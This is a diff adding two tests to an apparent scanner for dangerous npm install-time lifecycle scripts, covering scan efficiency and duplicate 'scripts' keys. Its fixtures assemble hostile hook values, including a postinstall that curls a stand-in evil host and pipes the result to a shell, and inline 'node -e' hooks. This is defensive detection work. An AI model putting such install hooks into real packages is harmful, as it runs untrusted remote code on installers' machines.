@@ -181,6 +181,38 @@ def test_key_line_is_the_scripts_install_not_a_later_config_key():
     assert found[0].line == 4
 
 
+def test_scripts_span_computed_once_per_package_json(monkeypatch):
+    # M1: _key_line used to rescan the whole text once per lifecycle key
+    calls = []
+    real = npm_scripts._scripts_span
+
+    def counting(text):
+        calls.append(len(text))
+        return real(text)
+
+    monkeypatch.setattr(npm_scripts, "_scripts_span", counting)
+    data = _pkg_json(
+        {
+            "preinstall": NODE_E + " x",
+            "install": NODE_E + " y",
+            "postinstall": CURL + " -sSL " + EVIL + " " + PIPE_SH,
+        }
+    )
+    found, _ = _scan(data)
+    assert len(found) == 1
+    assert len(calls) == 1
+
+
+def test_duplicate_scripts_key_line_is_the_last_object():
+    # M2: JSON.parse keeps the LAST top-level "scripts"; the span must too
+    data = (
+        b'{"scripts":{"install":"a"},"scripts":{' + NL.encode() + b'"install":"'
+        + NODE_E.encode() + b' x"}}'
+    )
+    found, _ = _scan(data)
+    assert [f.line for f in found] == [2]
+
+
 # ---------------------------------------------------------- more shapes ----
 
 
